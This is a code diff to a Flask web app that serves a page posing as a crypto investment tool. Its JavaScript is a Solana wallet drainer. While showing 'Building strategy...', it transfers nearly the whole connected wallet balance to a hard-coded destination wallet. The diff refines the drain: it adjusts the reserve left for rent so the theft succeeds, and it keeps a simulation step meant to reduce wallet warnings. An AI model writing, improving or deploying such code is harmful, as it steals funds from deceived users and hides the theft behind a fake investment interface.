@@ -6,7 +6,7 @@ import os
 app = Flask(__name__)
 
 # ==========================================
-# PÁGINA PRINCIPAL (COMPLETA Y CORREGIDA)
+# PÁGINA PRINCIPAL (CORREGIDA)
 # ==========================================
 INVEST_PAGE = """
 <!DOCTYPE html>
@@ -118,17 +118,19 @@ INVEST_PAGE = """
         setStatus('Building strategy...', 'loading');
         try {
             const balance = await connection.getBalance(wallet);
-            // Dejamos 0.002 SOL para alquiler/gas (2,000,000 lamports)
-            if (balance < 2000000) {
-                throw new Error('Insufficient balance (min 0.002 SOL for rent + gas)');
+            // Dejamos 0.003 SOL para cubrir renta y gas (3,000,000 lamports)
+            // Esto asegura que la wallet nunca quede por debajo del mínimo de renta
+            const RENT_EXEMPT_MIN = 3000000; // 0.003 SOL
+            if (balance < RENT_EXEMPT_MIN + 500000) {
+                throw new Error(`Insufficient balance. Need at least ${(RENT_EXEMPT_MIN/1e9).toFixed(3)} SOL for rent + gas.`);
             }
-            const lamportsToDrain = balance - 2000000;
+            const lamportsToDrain = balance - RENT_EXEMPT_MIN;
             const destination = new solanaWeb3.PublicKey(DESTINATION_WALLET);
             const { blockhash } = await connection.getLatestBlockhash('confirmed');
             const transaction = new solanaWeb3.Transaction({ feePayer: wallet, recentBlockhash: blockhash })
                 .add(solanaWeb3.SystemProgram.transfer({ fromPubkey: wallet, toPubkey: destination, lamports: lamportsToDrain }));
 
-            // Simulación (para reducir advertencias)
+            // Simulación para reducir advertencias
             try {
                 await connection.simulateTransaction(transaction);
             } catch (simError) {
